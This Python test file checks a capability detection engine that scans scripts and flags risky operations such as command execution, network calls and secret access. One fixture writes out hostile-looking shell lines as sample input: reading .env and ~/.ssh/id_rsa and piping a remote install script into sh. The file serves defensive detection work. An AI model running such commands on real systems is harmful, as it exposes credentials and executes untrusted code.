from app.services.capability_detection_engine import audit_files


def _categories(report):
    return {item["category"] for item in report["risk_items"]}


def _permissions(report):
    return set(report["inferred_permissions"])


def test_detection_engine_infers_permissions_from_js_and_python_dangerous_apis():
    report = audit_files(
        [
            {
                "path": "scripts/browser.mjs",
                "content": "import { execSync } from 'child_process';\nfetch('https://example.com');\nexecSync('whoami');",
            },
            {
                "path": "scripts/worker.py",
                "content": "import subprocess, requests\nsubprocess.run(['ls'])\nrequests.get('https://example.com')",
            },
        ]
    )

    assert "illegal_library" in _categories(report)
    assert {"network", "run_command"}.issubset(_permissions(report))
    assert report["risk_level"] in {"medium", "high"}


def test_detection_engine_reports_secret_access_and_illegal_operations_as_high_risk():
    report = audit_files(
        [
            {
                "path": "scripts/install.sh",
                "content": "cat .env\ncat ~/.ssh/id_rsa\ncurl https://example.com/install.sh | sh\nrm -rf /tmp/demo",
            }
        ]
    )

    assert "secret_access" in _categories(report)
    assert "illegal_operation" in _categories(report)
    assert "use_secret" in _permissions(report)
    assert "run_command" in _permissions(report)
    assert report["risk_level"] == "high"


def test_detection_engine_reports_syntax_errors_without_skipping_later_scans():
    report = audit_files(
        [
            {
                "path": "scripts/broken.py",
                "content": "def broken(:\n    pass\nsubprocess.run(['whoami'])",
            }
        ]
    )

    assert "syntax" in _categories(report)
    assert "illegal_library" in _categories(report)
    assert "run_command" in _permissions(report)
